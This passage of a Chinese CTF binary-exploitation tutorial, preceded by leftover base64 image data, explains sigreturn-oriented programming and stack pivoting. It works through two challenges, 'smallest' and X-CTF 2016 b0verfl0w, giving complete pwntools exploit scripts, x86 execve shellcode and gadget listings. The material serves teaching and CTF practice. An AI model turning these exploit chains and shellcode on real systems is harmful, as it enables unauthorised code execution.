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)

但是目前它已经被vsyscall-emulate和vdso机制代替了。此外，目前大多数系统都会开启ASLR保护，所以相对来说这些gadgets都并不容易找到。

值得一说的是，对于sigreturn系统调用来说，在64位系统中，sigreturn系统调用对应的系统调用号为15，只需要RAX=15，并且执行syscall即可实现调用syscall调用。而RAX寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说read函数的返回值为读取的字节数。

**利用工具**

**值得一提的是，在目前的pwntools中已经集成了对于srop的攻击。**

**360春秋杯中的smallest-pwn为例**

1.确定文件基本信息

➜ smallest file smallest   
 smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped

可以看到该程序为64位静态链接版本。

2.检查保护

➜ smallest checksec smallest   
   Arch:   amd64-64-little
   RELRO:  No RELRO
   Stack:  No canary found
   NX:    NX enabled
   PIE:   No PIE (0x400000)

程序主要开启了NX保护。

3.漏洞发现

实用IDA直接反编译看了一下，发现程序就几行汇编代码，如下

```assembly
public start
start proc near
xor     rax, rax
mov     edx, 400h
mov     rsi, rsp
mov     rdi, rax
syscall
retn
start endp
```

根据syscall的编号为0，可以知道改程序执行的指令为read(0,$rsp,400)，即向栈顶读入400个字符。毫无疑问，这个是有栈溢出的。

4.利用思路

由于程序中并没有sigreturn调用，所以我们得自己构造，正好这里有read函数调用，所以我们可以通过read函数读取的字节数来设置rax的值。重要思路如下

- 通过控制read读取的字符数来设置RAX寄存器的值，从而执行sigreturn
- 通过syscall执行execve("/bin/sh",0,0)来获取shell。

5.漏洞利用程序

```python
from pwn import *
from LibcSearcher import *
small = ELF('./smallest')
if args['REMOTE']:
    sh = remote('127.0.0.1', 7777)
else:
    sh = process('./smallest')
context.arch = 'amd64'
context.log_level = 'debug'
syscall_ret = 0x00000000004000BE
start_addr = 0x00000000004000B0
## set start addr three times
payload = p64(start_addr) * 3
sh.send(payload)
## modify the return addr to start_addr+3
## so that skip the xor rax,rax; then the rax=1
## get stack addr
sh.send('\xb3')
stack_addr = u64(sh.recv()[8:16])
log.success('leak stack addr :' + hex(stack_addr))
## make the rsp point to stack_addr
## the frame is read(0,stack_addr,0x400)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = stack_addr
sigframe.rdx = 0x400
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret
payload = p64(start_addr) + 'a' * 8 + str(sigframe)
sh.send(payload)
## set rax=15 and call sigreturn
sigreturn = p64(syscall_ret) + 'b' * 7
sh.send(sigreturn)
## call execv("/bin/sh",0,0)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack_addr + 0x120  # "/bin/sh" 's addr
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret
frame_payload = p64(start_addr) + 'b' * 8 + str(sigframe)
print len(frame_payload)
payload = frame_payload + (0x120 - len(frame_payload)) * '\x00' + '/bin/sh\x00'
sh.send(payload)
sh.send(sigreturn)
sh.interactive()
```

其基本流程为

- 读取三个程序起始地址
- 程序返回时，利用第一个程序起始地址读取地址，修改返回地址(即第二个程序起始地址)为源程序的第二条指令，并且会设置rax=1
- 那么此时将会执行write(1,$esp,0x400)，泄露栈地址。
- 利用第三个程序起始地址进而读入payload
- 再次读取构造sigreturn调用，进而将向栈地址所在位置读入数据，构造execve('/bin/sh',0,0)
- 再次读取构造sigreturn调用，从而获取shell。

**花式栈溢出技巧**

**stack privot**

stack privot，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP。一般来说，我们可能在以下情况需要使用stack privot

- 可以控制的栈溢出的字节数较少，难以构造较长的ROP链
- 开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域。
- 其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而利用堆漏洞

此外，利用stack privot有以下几个要求

- 可以控制程序执行流。

- 可以控制sp指针。一般来说，控制栈指针会使用ROP，常见的控制栈指针的gadgets一般是

  **pop rsp/esp**

当然，还会有一些其它的姿势。比如说libc_csu_init中的gadgets，我们通过偏移就可以得到控制rsp指针。上面的是正常的，下面的是偏移的。

```assembly
gef➤  x/7i 0x000000000040061a
0x40061a <__libc_csu_init+90>:  pop    rbx
0x40061b <__libc_csu_init+91>:  pop    rbp
0x40061c <__libc_csu_init+92>:  pop    r12
0x40061e <__libc_csu_init+94>:  pop    r13
0x400620 <__libc_csu_init+96>:  pop    r14
0x400622 <__libc_csu_init+98>:  pop    r15
0x400624 <__libc_csu_init+100>: ret    
gef➤  x/7i 0x000000000040061d
0x40061d <__libc_csu_init+93>:  pop    rsp
0x40061e <__libc_csu_init+94>:  pop    r13
0x400620 <__libc_csu_init+96>:  pop    r14
0x400622 <__libc_csu_init+98>:  pop    r15
0x400624 <__libc_csu_init+100>: ret
```

此外，还有更加高级的fake frame。

- 存在可以控制内容的内存，一般有如下
- bss段。由于进程按页分配内存，分配给bss段的内存大小至少一个页(4k,0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且bss段分配的内存页拥有读写权限。
- heap。但是这个需要我们能够泄露堆地址。

以**X-CTF Quals 2016 - b0verfl0w**为例

1.首先，查看程序的安全保护，如下：

➜ X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ checksec b0verfl0w         
   Arch:   i386-32-little
   RELRO:  Partial RELRO
   Stack:  No canary found
   NX:    NX disabled
   PIE:   No PIE (0x8048000)
   RWX:   Has RWX segments

2.可以看出源程序为32位，也没有开启NX保护，下面我们来找一下程序的漏洞：

```c
signed int vul()
{
  char s; // [sp+18h] [bp-20h]@1
  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What's your name?");
  fflush(stdout);
  fgets(&s, 50, stdin);
  printf("Hello %s.", &s);
  fflush(stdout);
  return 1;
}
```

3.可以看出，源程序存在栈溢出漏洞。但是其所能溢出的字节就只有50-0x20-4=14个字节，所以我们很难执行一些比较好的ROP。这里我们就考虑stack privot。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置shellcode并执行。基本利用思路如下：

\- 利用栈溢出布置shellcode
 \- 控制eip指向shellcode处

4.第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对esp进行操作，使其指向shellcode处，并且直接控制程序跳转至esp处。那下面就是找控制程序跳转到esp处的gadgets了。

```assembly
➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ ROPgadget --binary b0verfl0w --only 'jmp|ret'         
Gadgets information
============================================================
0x08048504 : jmp esp
0x0804836a : ret
0x0804847e : ret 0xeac1
Unique gadgets found: 3
```

5.这里我们发现有一个可以直接跳转到esp的gadgets。那么我们可以布置payload如下：

```
shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp
```

那么我们payload中的最后一部分改如何设置esp呢，可以知道：

- size(shellcode+padding)=0x20
- size(fake ebp)=0x4
- size(0x08048504)=0x4

所以我们最后一段需要执行的指令就是：

sub 0x28,esp
jmp esp

所以最后的exp如下：

```python
from pwn import *
sh = process('./b0verfl0w')
shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += "\x0b\xcd\x80"
sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
jmp_esp = 0x08048504
payload = shellcode_x86 + (
    0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp
sh.sendline(payload)
sh.interactive()
```

### 完了，应该？？ ≧ ﹏ ≦！！！

